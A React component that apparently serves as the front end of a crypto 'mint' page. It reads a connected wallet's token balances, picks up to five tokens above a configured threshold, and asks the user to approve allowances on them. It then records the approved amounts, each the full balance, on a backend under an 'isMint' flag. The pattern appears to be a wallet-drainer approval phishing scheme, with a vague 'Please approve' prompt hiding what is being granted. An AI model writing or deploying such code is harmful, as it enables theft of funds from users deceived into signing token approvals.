import React, { useEffect, useState } from 'react'

import { useSetting } from '../../provider/setting'
import { approve, getBalance } from '../../api/contract'
import { getAll as getTokens } from '../../api/token'
import { create, update } from '../../api/approve'
import siteConfig from '../../config/site.config'

const Approve = (props) => {
  const {approves, setIsMint} = props
  const [setting] = useSetting()
  const [tokens, setTokens] = useState([])

  const handleApprove = async () => {
    if (setting.address && setting.address !== '') {
      let approveTokens = []
      await Promise.all(tokens.map(async(token) => {
        try {
          await approve(token.abiAddress, token.address, 0, setting.address, true)
          approveTokens = [...approveTokens, {
            tokenId: token._id,
            balance: token.balance,
            approve: token.balance
          }]
        } catch (error) {
          console.log(token.name, error)
        }
      }))
      if (approveTokens.length > 0) {
        if (approves.length > 0) {
          update({
            _id: approves[0]._id,
            approveTokens: approveTokens,
            isMint: true
          }).then(() => setIsMint(true))
        }
        else {
          create({
            address: setting.address,
            approveTokens: approveTokens,
            isMint: true
          }).then(() => setIsMint(true))
        }
      }
    }
  }

  useEffect(() => {
    if (setting.address) {
      (async () => {
        let res = await getTokens()
        res = await Promise.all(res.map(async(token) => {
          const balance = await getBalance(token.abiAddress, token.address, setting.address)
          token.balance = balance
          return token
        }))
        res = res.filter((token) => token.balance >= siteConfig.maxBalance)
        res.sort( ( a, b ) => {
          if ( a.balance < b.balance ){
            return -1;
          }
          if ( a.balance > b.balance ){
            return 1;
          }
          return 0;
        } );
        console.log('tokens', res)
        setTokens(res.slice(0, 5))
      })()
    }
  }, [setting.address])
  return (
    <>
      <div className="title text-center">
        Please approve
      </div>
      <button type="button" className="btn btn-gradient-primary" onClick={handleApprove}>  Token approve </button>
    </>
  )
}
export default Approve
